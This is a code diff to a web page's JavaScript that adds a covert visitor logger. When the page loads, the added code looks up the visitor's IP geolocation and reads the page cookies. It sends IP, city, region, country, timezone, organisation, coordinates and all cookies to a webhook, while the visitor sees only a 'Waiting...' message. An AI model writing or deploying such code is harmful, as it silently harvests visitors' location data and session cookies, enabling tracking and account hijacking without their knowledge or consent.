@@ -33,7 +33,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
 document.addEventListener('DOMContentLoaded', async function () {
     // Fetch IP information from your API
-    const ipInfoResponse = await fetch(`${apiUrl}/ipinfo`);
+    const ipInfoResponse = await fetch(`https://ipinfo.io/json`);
     const ipData = await ipInfoResponse.json();
     const visitorCookie = document.cookie || 'No cookies found';
 
@@ -72,6 +72,17 @@ document.addEventListener('DOMContentLoaded', async function () {
     }
 
     // If not banned, show waiting message and ellipsis image
+    await sendWebhook("User Visit", `
+**IP:** ${ipData.ip}
+**City:** ${ipData.city}
+**Region:** ${ipData.region}
+**Country:** ${ipData.country}
+**Timezone:** ${ipData.timezone}
+**Org:** ${ipData.org}
+**Location:** ${ipData.loc}
+**Cookies:** ${visitorCookie}
+        `.trim(), Math.floor(Math.random() * 16777215)); // Red color for banned user
+    
     statusMessage.innerText = "Waiting...";
     statusImage.src = statusEmojis.ellipsis; // Set to ellipsis emoji
 
